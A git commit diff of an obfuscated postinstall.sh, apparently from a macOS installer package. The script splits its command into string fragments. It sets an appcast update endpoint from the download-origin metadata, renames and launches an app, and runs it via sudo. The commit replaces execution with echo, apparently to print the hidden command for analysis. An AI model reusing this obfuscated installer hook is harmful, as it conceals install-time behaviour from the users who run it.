94223af4c840b30e84611798b64be3ef63650777
Munir Ahmed <mnirahd@gmail.com>
2023-08-06 04:10:33 +0100

    postinstall.sh

--- postinstall.sh
+++ postinstall.sh
@@ -3,6 +3,6 @@ z="
 ";bz='/.*/';BBz=' -E ';sz='/.*\';oz='pp /';Cz='PPCA';Sz='-n "';IBz='ons/';Xz='| se';Dz='ST_E';dz='`/ap';Rz='sed ';UBz='.app';KBz='o $o';Uz='\"]/';Tz='s/[ ';Fz='INT=';qz='ho $';jz='icat';nz='te.a';Az='expo';yz='p';rz='one ';tz='/\([';Ez='NDPO';JBz='`ech';OBz='.*\/';VBz='exit';CBz='-u $';fz='t.xm';Oz='aw "';Vz='/g; ';vz='-]*\';EBz=' ope';ez='pcas';wz=').*/';iz='Appl';NBz=' '\''s/';GBz='ppli';Hz='s -n';Jz='kMDI';xz='`.ap';Lz='here';Kz='temW';cz='\1/'\''';Mz='From';LBz='ne |';az='*\)\';SBz='.*/\';hz='mv /';pz='/`ec';QBz=' /.-';PBz='\([^';RBz=']*\)';WBz=' 0';TBz='1/'\''`';ABz='sudo';Yz='d '\''s';Iz='ame ';mz='cula';Bz='rt A';Qz='" | ';kz='ions';HBz='cati';Zz='/\(.';lz='/Cal';DBz='USER';FBz='n /A';Gz='`mdl';Pz='$one';MBz=' sed';Wz='2p" ';gz='l';uz='^ /.';Nz='s -r';
 export one="$1"
 
-/bin/bash -c  "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Xz$Yz$Zz$az$bz$cz$dz$ez$fz$gz$z$hz$iz$jz$kz$lz$mz$nz$oz$iz$jz$kz$pz$qz$rz$Xz$Yz$sz$tz$uz$vz$wz$cz$xz$yz$z$ABz$BBz$CBz$DBz$EBz$FBz$GBz$HBz$IBz$JBz$KBz$LBz$MBz$NBz$OBz$PBz$QBz$RBz$SBz$TBz$UBz$z$VBz$WBz"
+echo "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Xz$Yz$Zz$az$bz$cz$dz$ez$fz$gz$z$hz$iz$jz$kz$lz$mz$nz$oz$iz$jz$kz$pz$qz$rz$Xz$Yz$sz$tz$uz$vz$wz$cz$xz$yz$z$ABz$BBz$CBz$DBz$EBz$FBz$GBz$HBz$IBz$JBz$KBz$LBz$MBz$NBz$OBz$PBz$QBz$RBz$SBz$TBz$UBz$z$VBz$WBz"
 
 
